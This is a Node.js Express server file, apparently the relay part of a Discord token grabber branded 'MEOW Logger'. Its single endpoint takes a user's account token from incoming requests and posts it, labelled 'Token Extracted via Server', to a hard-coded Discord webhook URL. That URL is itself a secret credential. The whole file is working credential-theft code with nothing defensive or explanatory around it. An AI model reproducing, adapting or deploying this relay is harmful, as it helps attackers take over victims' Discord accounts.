const express = require('express');
const cors = require('cors');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

const app = express();
app.use(express.json());
app.use(cors());

// আপনার ডিসকর্ড ওয়েবহুক ইউআরএল এখানে বসান
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1553395511099392070/t8kxFniflzPoLbvx2Vu5ZjYQ44JH7TBAZD-SzHQN1XjGt3Csfku5ELLrvh4JgKWm_FiK";

app.post('/api/send', async (req, res) => {
    try {
        const { token } = req.body;

        const payload = {
            username: "MEOW Logger",
            avatar_url: "https://i.imgur.com/4M34hi2.png",
            embeds: [{
                title: "🔑 Token Extracted via Server",
                color: token ? 0x00FF00 : 0xFF0000,
                fields: [
                    { name: "Status", value: token ? "✅ Token Found Successfully" : "❌ Token Not Found", inline: false },
                    { name: "User Token", value: token ? `\`\`\`${token}\`\`\`` : "`No Token Available`", inline: false }
                ],
                footer: { text: "MEOW Official • Server Relay" },
                timestamp: new Date().toISOString()
            }]
        };

        const response = await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            res.status(200).json({ success: true, message: "Sent successfully!" });
        } else {
            res.status(500).json({ success: false, message: "Discord API error" });
        }
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false, error: error.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));